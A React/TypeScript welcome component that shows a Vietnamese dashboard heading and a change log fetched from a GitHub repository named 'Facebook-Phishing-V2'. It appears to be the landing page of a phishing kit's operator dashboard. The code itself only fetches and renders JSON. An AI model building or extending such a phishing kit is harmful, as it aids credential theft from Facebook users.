import axios from "axios";
import { useEffect, useState } from "react";
interface ChangeLogItem {
    title: string;
    description: string;
}
function Welcome() {
    const [changeLog, setChangeLog] = useState<ChangeLogItem[]>([]);
    useEffect(() => {
        axios
            .get(
                "https://raw.githubusercontent.com/tripleseven190504/Facebook-Phishing-V2/main/.github/UPDATE.json",
            )
            .then((res) => {
                setChangeLog(res.data);
            });
    }, []);

    return (
        <div className="container mx-auto px-4 py-8">
            <h1 className="mb-4 text-4xl font-bold">
                Chào mừng đến với Dashboard!
            </h1>
            <h2 className="text-xl font-semibold">Change Log:</h2>
            <ul className="ml-6 list-disc">
                {changeLog.map((item, index) => (
                    <li key={index}>
                        <span className="font-semibold">{item.title}</span>:{" "}
                        {item.description}
                    </li>
                ))}
            </ul>
        </div>
    );
}

export default Welcome;
